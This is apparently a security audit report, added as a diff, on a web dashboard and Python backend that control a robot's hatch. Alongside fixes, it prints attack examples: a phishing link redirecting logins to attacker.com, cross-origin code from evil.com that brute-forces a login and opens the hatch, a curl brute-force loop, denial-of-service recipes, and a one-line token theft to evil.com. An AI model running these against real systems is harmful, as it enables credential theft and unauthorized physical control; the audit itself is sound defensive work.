@@ -1,0 +1,426 @@
+## Executive Summary
+
+**13 findings** identified: **2 High**, **7 Medium**, **4 Low**. The top risks are a query parameter that can redirect login credentials to an attacker's server, and a wildcard CORS policy that lets any website send commands to the robot, All fixes are small configuration changes
+
+---
+
+## #1 — API Base URL Overridable via Query Parameter
+
+**Location:** `netlify-hatch-dashboard/index.html` | **Severity:** High
+
+The front-end allows the API base URL to be set through a query parameter, causing all API calls, including the login request that sends username and password in the POST body, to use this value:
+
+```js
+let API=(params.get('api')||configured||location.origin).replace(/\/$/,'');
+```
+
+```js
+const r=await fetch(API+'/api/login',{
+  method:'POST',
+  headers:{'Content-Type':'application/json'},
+  body:JSON.stringify({username,password})
+});
+```
+
+An attacker can send a link like `https://dashboard.example.com/?api=https://attacker.com` to a victim. The victim sees the real UI served from the legitimate Netlify domain, but credentials are sent to the attacker's server on login. If a session token already exists in `sessionStorage`, it is also leaked on page load when `checkSession()` fires and sends `Authorization: Bearer <token>` to the attacker's endpoint.
+
+The `?api=` parameter can be hidden at the end of a long URL with fake tracking parameters to avoid suspicion:
+
+```
+https://dashboard.example.com/?utm_source=email&utm_campaign=snoonu&api=https://attacker.com
+```
+
+There is no Content-Security-Policy `connect-src` directive in `netlify.toml` to restrict where `fetch()` can connect, so the browser allows the redirect silently.
+
+**Recommendation:** Remove the `?api=` query parameter override entirely. If multiple environments are needed, use `config.js` only with environment-specific builds. Add a CSP header with `connect-src` restricted to the real backend URL.
+
+---
+
+## #2 — Unauthenticated Information Disclosure on /api/health
+
+**Location:** `render-backend/backend.py` | **Severity:** Medium
+
+The `/api/health` endpoint has no authentication check, unlike all other endpoints which call `self.require_session()`. It returns the active session details, robot serial number, and server configuration state to any caller:
+
+```python
+if self.path.split("?")[0] == "/api/health":
+    self.json_response({
+        "code": 200,
+        "data": {
+            "ok": True,
+            "robotSn": ROBOT_SN,
+            "session": sessions.snapshot(),       # leaks active user info
+            "missingConfig": missing_config(),    # leaks server config
+        },
+        "msg": "",
+    })
+```
+
+```python
+def snapshot(self):
+    with self.lock:
+        active = not self.expired()
+        return {
+            "active": active,
+            "user": self.user if active else None,
+            "expiresAt": int(self.expires_at) if active else 0,
+            "ttlSeconds": SESSION_TTL_SECONDS,
+        }
+```
+
+This gives any unauthenticated user the ability to see who is currently using the dashboard, their username, when their session expires, the robot serial number, and which environment variables are configured on the server:
+
+```
+$ curl -s https://render-backend-wvsw.onrender.com/api/health
+
+{"code": 200, "data": {"ok": true, "robotSn": "4E002548000E",
+"session": {"active": false, "user": null, "expiresAt": 0, "ttlSeconds": 30},
+"missingConfig": []}, "msg": ""}
+```
+
+An attacker can poll this endpoint to learn valid usernames when someone is logged in, know exactly when a session expires to time a login, and enumerate server configuration state.
+
+**Recommendation:** Remove `session` and `missingConfig` from the unauthenticated response. If a health check is needed for monitoring, limit it to `{"ok": true}`, or require authentication.
+
+---
+
+## #3 — Wildcard CORS Allows Cross-Origin Robot Control
+
+**Location:** `render-backend/backend.py` | **Severity:** High
+
+The backend sets `Access-Control-Allow-Origin: *` on every response, including the preflight response that explicitly allows the `Authorization` header:
+
+```python
+def cors(self):
+    self.send_header("Access-Control-Allow-Origin", "*")
+    self.send_header("Access-Control-Allow-Methods", "GET,POST,PUT,OPTIONS")
+    self.send_header("Access-Control-Allow-Headers", "Authorization,Content-Type")
+```
+
+This means any website on the internet can make authenticated API requests to the backend. An attacker's page at `evil.com` can brute-force credentials via `POST /api/login`, read the token from the response body (allowed because `*` permits reading cross-origin responses), then call `PUT /api/hatch/open` to physically open the robot's hatch — all from the victim's browser without them knowing.
+
+```js
+// Running on evil.com — works because CORS is *
+fetch('https://render-backend-wvsw.onrender.com/api/login', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({username: 'admin', password: 'guessed'})
+})
+.then(r => r.json())
+.then(d => {
+  if (d.data?.token) {
+    fetch('https://render-backend-wvsw.onrender.com/api/hatch/open', {
+      method: 'PUT',
+      headers: {'Authorization': 'Bearer ' + d.data.token}
+    });
+  }
+});
+```
+
+**Recommendation:** Replace `*` with the actual Netlify frontend origin (e.g., `https://snoonu-dashboard.netlify.app`). If multiple frontends need access, validate the `Origin` header against an allowlist.
+
+---
+
+## #4 — No Rate Limiting on Login — Brute Force
+
+**Location:** `render-backend/backend.py` | **Severity:** Medium
+
+There is no rate limiting, account lockout, or CAPTCHA on the `POST /api/login` endpoint. An attacker can try unlimited username/password combinations at full network speed:
+
+```python
+if path == "/api/login":
+    token, result = sessions.login(body.get("username", ""), body.get("password", ""))
+    if token:
+        result["data"]["token"] = token
+        self.json_response(result)
+    else:
+        self.json_response(result, result.get("code", 400))
+    return
+```
+
+Credentials are loaded from the `DASHBOARD_USERS` environment variable as simple `user:pass` pairs, which are likely short and guessable. Combined with #3 (wildcard CORS), the brute-force can be executed from any origin, including an attacker's website.
+
+```bash
+# Trivial brute-force loop
+for pw in $(cat wordlist.txt); do
+  curl -s -X POST https://render-backend-wvsw.onrender.com/api/login \
+    -H 'Content-Type: application/json' \
+    -d "{\"username\":\"admin\",\"password\":\"$pw\"}" | grep -q '"code": 200' && echo "Found: $pw" && break
+done
+```
+
+**Recommendation:** Add per-IP rate limiting with exponential backoff on failed attempts. Consider account lockout after N failures, or add a CAPTCHA after repeated failures.
+
+---
+
+## #5 — Weak PRNG for API Signing Nonce
+
+**Location:** `render-backend/backend.py` | **Severity:** Medium
+
+The `nonce()` function uses `random.choices()`, which is the Mersenne Twister PRNG — not cryptographically secure. The codebase already imports `secrets` and uses it for session tokens, but the nonce uses `random` instead:
+
+```python
+import random          # NOT cryptographically secure
+import secrets         # IS cryptographically secure — used for tokens but not nonces
+
+def nonce():
+    return "".join(random.choices(string.ascii_letters + string.digits, k=8))
+```
+
+The nonce is a direct input to the `sign()` function used to authenticate requests to the Alpha robot API:
+
+```python
+timestamp, alpha_nonce = ts(), nonce()
+signature = sign(timestamp, alpha_nonce, body=body_str, qs=qs)
+```
+
+With approximately 624 observed outputs, the Mersenne Twister internal state can be fully reconstructed and all future nonces predicted. On its own this does not allow signature forgery (the attacker would also need `APP_SECRET`, `APP_ID`, and `APP_KEY`), but it removes one layer of the signing scheme's security and violates the assumption that each request carries a unique, unpredictable nonce.
+
+**Recommendation:** Replace `random.choices` with `secrets.token_urlsafe()` or `secrets.token_hex()` in the `nonce()` function.
+
+---
+
+## #6 — Plaintext Password Storage
+
+**Location:** `render-backend/backend.py` | **Severity:** Medium
+
+Passwords are stored as plaintext in the `DASHBOARD_USERS` environment variable and loaded directly into memory without hashing:
+
+```python
+def load_users():
+    raw = os.environ.get("DASHBOARD_USERS", "")
+    users = {}
+    for item in raw.split(","):
+        if ":" not in item:
+            continue
+        username, password = item.split(":", 1)
+        username, password = username.strip(), password.strip()
+        if username and password:
+            users[username] = password      # stored as plaintext
+    return users
+```
+
+While `hmac.compare_digest` is used for timing-safe comparison (line 156), the passwords themselves are never hashed. Anyone with access to the Render dashboard, CI/CD logs, container inspection, or `/proc/<pid>/environ` on the host immediately obtains all user passwords in cleartext.
+
+**Recommendation:** Hash passwords with bcrypt, scrypt, or argon2 before storing them. Compare against the hash at login time.
+
+---
+
+## #7 — Non-Constant-Time Session Token Comparison
+
+**Location:** `render-backend/backend.py` | **Severity:** Low
+
+The session token comparison uses Python's `!=` operator, which short-circuits on the first differing byte:
+
+```python
+def validate(self, token, refresh=True):
+    with self.lock:
+        if not token or token != self.token or self.expired():
+            return False
+```
+
+In contrast, the password comparison correctly uses `hmac.compare_digest`:
+
+```python
+if not expected or not hmac.compare_digest(expected, password or ""):
+```
+
+The same constant-time comparison should be applied to the session token. While `secrets.token_urlsafe(32)` tokens are high-entropy (making exploitation difficult), the inconsistency creates unnecessary risk that an attacker could measure timing differences to recover the token byte by byte.
+
+**Recommendation:** Replace `token != self.token` with `not hmac.compare_digest(token, self.token)`.
+
+---
+
+## #8 — SHA-1 Signing with Length-Extension Vulnerable Construction
+
+**Location:** `render-backend/backend.py` | **Severity:** Low
+
+The API signing function uses `SHA1(secret || message)` — not proper HMAC — which is vulnerable to length-extension attacks:
+
+```python
+def sign(timestamp, alpha_nonce, body="", qs=""):
+    if qs:
+        pairs = sorted(p.split("=", 1) for p in qs.split("&") if "=" in p)
+        raw = (
+            APP_SECRET
+            + "&".join(f"{k}={v}" for k, v in pairs)
+            + f"alphaAppId={APP_ID}&alphaAppKey={APP_KEY}&alphaNonce={alpha_nonce}&timestamp={timestamp}"
+        )
+    elif body:
+        raw = f"{APP_SECRET}alphaAppId={APP_ID}&alphaAppKey={APP_KEY}&alphaNonce={alpha_nonce}&timestamp={timestamp}{body}"
+    else:
+        raw = f"{APP_SECRET}alphaAppId={APP_ID}&alphaAppKey={APP_KEY}&alphaNonce={alpha_nonce}&timestamp={timestamp}"
+    return hashlib.sha1(raw.encode()).hexdigest().lower()
+```
+
+An attacker who observes a valid signature for message M can compute a valid signature for `M || padding || attacker_data` without knowing the secret. Additionally, the body is concatenated directly after the timestamp with no delimiter, which creates canonicalization ambiguity.
+
+**Recommendation:** Use `hmac.new(secret, message, hashlib.sha256)` instead of raw `SHA1(secret || message)`. This may be constrained by the Alpha robot API specification.
+
+---
+
+## #9 — Missing Security Headers
+
+**Location:** `netlify-hatch-dashboard/netlify.toml` | **Severity:** Medium
+
+The current headers provide partial protection:
+
+```toml
+[headers.values]
+  X-Frame-Options = "DENY"
+  X-Content-Type-Options = "nosniff"
+  Referrer-Policy = "no-referrer"
+```
+
+The following critical headers are missing:
+
+**Content-Security-Policy** — Without CSP, there is no restriction on where `fetch()` can connect (enables finding #1), no restriction on inline/external scripts, and no data exfiltration controls. Since the application currently uses an inline `<script>` block, the policy must allow it (via hash or `'unsafe-inline'`). Ideally the script should be moved to an external file so a strict policy can be used:
+```
+Content-Security-Policy: default-src 'self'; connect-src https://render-backend-wvsw.onrender.com; script-src 'self' 'unsafe-inline'; img-src 'self'; style-src 'self' 'unsafe-inline'; frame-ancestors 'none'
+```
+
+**Strict-Transport-Security** — Without HSTS, the first connection can be downgraded to HTTP via SSL stripping:
+```
+Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
+```
+
+**Permissions-Policy** — Without it, XSS can request camera, microphone, and geolocation:
+```
+Permissions-Policy: camera=(), microphone=(), geolocation=()
+```
+
+**Recommendation:** Add all three headers to `netlify.toml`. The CSP header alone would mitigate finding #1 (API URL override) by restricting `connect-src`.
+
+---
+
+## #10 — http.server Not Production Grade — Slowloris / OOM / Thread Exhaustion
+
+**Location:** `render-backend/backend.py` | **Severity:** Medium
+
+Python's `http.server` documentation explicitly states it is not recommended for production. The `ThreadingHTTPServer` spawns a new thread per connection with no limits:
+
+```python
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+
+# ...
+
+ThreadingHTTPServer(("", PORT), Handler).serve_forever()
+```
+
+Request body parsing has no size limit — the server reads whatever `Content-Length` the client claims:
+
+```python
+def body(self):
+    length = int(self.headers.get("Content-Length", 0))
+    raw = self.rfile.read(length) if length else b""
+```
+
+This enables multiple denial-of-service attacks:
+
+- **Slowloris:** Open 1000+ connections that send headers one byte at a time. Each holds a thread indefinitely.
+- **OOM:** Send `Content-Length: 999999999` with a small body. The server attempts to allocate that much memory.
+- **Hang:** Send `Content-Length: -1`. `rfile.read(-1)` reads until EOF, blocking the thread forever.
+- **No graceful shutdown:** No `SIGTERM` handler. Container kill during an active session skips `close_hatch()`, leaving the physical hatch open.
+
+**Recommendation:** Replace `http.server` with a production WSGI server like `gunicorn` or `waitress`. This solves thread pool limits, request body size limits, connection timeouts, slowloris protection, and graceful shutdown in one change.
+
+---
+
+## #11 — Container Runs as Root
+
+**Location:** `render-backend/Dockerfile` | **Severity:** Medium
+
+The Dockerfile has no `USER` directive, so the Python process runs as root inside the container:
+
+```dockerfile
+FROM python:3.12-slim
+WORKDIR /app
+COPY backend.py .
+EXPOSE 5000
+CMD ["python", "backend.py"]
+```
+
+If an attacker achieves remote code execution through the Python server, they have root privileges inside the container, widening the blast radius to container escape exploits.
+
+**Recommendation:** Add a non-root user:
+```dockerfile
+RUN adduser --disabled-password --no-create-home appuser
+USER appuser
+```
+
+---
+
+## #12 — Single-Session Model Enables Denial of Service
+
+**Location:** `render-backend/backend.py` | **Severity:** Medium
+
+Only one session can be active at a time. If an attacker knows valid credentials, they can log in, lock out all legitimate users, and keep the session alive indefinitely by sending any authenticated request (which refreshes the TTL):
+
+```python
+with self.lock:
+    if not self.expired():
+        return None, {
+            "code": 423,
+            "data": {"activeUser": self.user},
+            "msg": "Dashboard is busy. Another user is already logged in.",
+        }
+```
+
+```python
+def validate(self, token, refresh=True):
+    with self.lock:
+        if not token or token != self.token or self.expired():
+            return False
+        if refresh:
+            self.expires_at = time.time() + SESSION_TTL_SECONDS
+        return True
+```
+
+There is no admin override, force-logout mechanism, or concurrent session support. An attacker with stolen credentials permanently locks out all legitimate users.
+
+**Recommendation:** Add a force-login mechanism that allows a new login to terminate the existing session, or support concurrent sessions with per-user limits.
+
+---
+
+## #13 — Token Stored in sessionStorage — XSS Accessible
+
+**Location:** `netlify-hatch-dashboard/index.html` | **Severity:** Low
+
+The session token is stored in `sessionStorage`, which is accessible to any JavaScript running in the same origin:
+
+```js
+let token=sessionStorage.getItem('hatchToken')||'';
+
+// On login:
+sessionStorage.setItem('hatchToken',token);
+```
+
+Any XSS payload (enabled by the missing CSP in finding #9) can steal the token in one line:
+
+```js
+fetch('https://evil.com/steal?t=' + sessionStorage.getItem('hatchToken'));
+```
+
+The token is also held in a global `let token` variable in the same script block, accessible to any injected script.
+
+**Recommendation:** If possible, move token storage to an `HttpOnly`, `Secure`, `SameSite=Strict` cookie. At minimum, add a CSP header (finding #9) to prevent unauthorized script execution.
+
+---
+
+## Summary
+
+| #  | Finding                                              | Severity   |
+|----|------------------------------------------------------|------------|
+| 1  | API Base URL overridable via `?api=` query parameter | High       |
+| 2  | Unauthenticated info disclosure on `/api/health`     | Medium     |
+| 3  | Wildcard CORS allows cross-origin robot control      | High       |
+| 4  | No rate limiting on login — brute force              | Medium     |
+| 5  | Weak PRNG for API signing nonce                      | Medium     |
+| 6  | Plaintext password storage                           | Medium     |
+| 7  | Non-constant-time session token comparison           | Low        |
+| 8  | SHA-1 signing with length-extension vulnerability    | Low        |
+| 9  | Missing security headers (CSP, HSTS)                | Medium     |
+| 10 | http.server not production grade — DoS vectors       | Medium     |
+| 11 | Container runs as root                               | Medium     |
+| 12 | Single-session model enables denial of service       | Medium     |
+| 13 | Token stored in sessionStorage — XSS accessible      | Low        |
